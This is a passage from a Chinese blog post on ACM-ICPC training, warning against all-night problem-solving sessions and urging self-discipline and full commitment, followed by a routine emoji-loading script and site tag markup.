title="有关训练的度"></a>有关训练的度</h2><p>我有时候通宵刷体，这里我不知道huicpc035有没有这个习惯，不过我通宵的时候没见到他通宵。<br>我觉得其实通宵刷体，或者太长时间地做题，还是不好的。我们为什么会这样有热情的做题呢，因为我们有兴趣；但是一个人的成功不仅仅依赖于兴趣，还要依赖于自控。这和打游戏是一个道理，游戏太有趣以至于我们常常通宵——ICPC题目也太有趣，所以有时候通宵。而且很多时候是，由于一道题AC不掉，所以赌气一定要搞定才睡觉，这样一不小心，就通宵了。</p><p>其实我明白，通宵不一定效果好，这仅仅说明了你兴趣很高涨而已。通宵往往会打乱你的时间安排，打乱你的生物钟，进而影响你短期或是中期的训练计划。而且，疲惫的状态下做题，你往往只有ac题目的欲望，而完全丧失了ac题目的灵气。所以，我建议，ACMer一定要合理安排作息，能够自控，这样不仅仅对你做 ACM-ICPC有好处。</p><p>总之，有效训练是很重要，只有通过有效的训练你才能获得你参加这个比赛应得的东西。</p><p>还有就是，除了035以外，另一个值得大家学习的就是richardxx——我也很佩服，我并不觉得他是天才，我觉得他以全方位的努力让他自己变得优秀，大家看他的blog可以看到他的学习历程。</p><p>最后要说下刻苦训练这一点，这个我主要想说给我们学校的acm队员：</p><p>客观的说，我们学校很多名校落榜生（我相比而言是水进的）。确实都蛮聪明的，但再聪明也比不上ACRush吧？人家可是SGU都切满了！ACM不是智力测试，不是你什么都不做就可以天上掉馅饼的。当然我不是说题目一定要做多少多少道，但如果你觉得你可以一心二用，从概率上来讲，你百分之九十地错了，我是个工科生，我相信概率而非奇迹。</p><p>我觉得035这方面也是值得我们学习的，我比较喜欢扯淡，有时候聊题目的时候也经常不小心就去扯其他话题去了，在学习的时候，035是坚决不多聊乱七八糟的东西的，除了讨论上QQ，平时据我观察都是残酷地训练。现在回想起来，我有点后悔，QQ上和网上花掉的时间用来学习新的东西，也许结果会更好。</p><p>ACM-ICPC绝不是大学生活的全部，也不是搞算法的全部，你大可以花时间去做其他研究，做项目，或者参加学生工作(我更欣赏那些对人生和职业有良好规划的ACMer)；但是，如果你搞ICPC的那段时间你不是全部投入，那的在ACM-ICPC生涯中，将只有后悔。</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 心路历程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ACM </tag>
            
            <tag> 算法 </tag>
            
            <tag> 训练 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
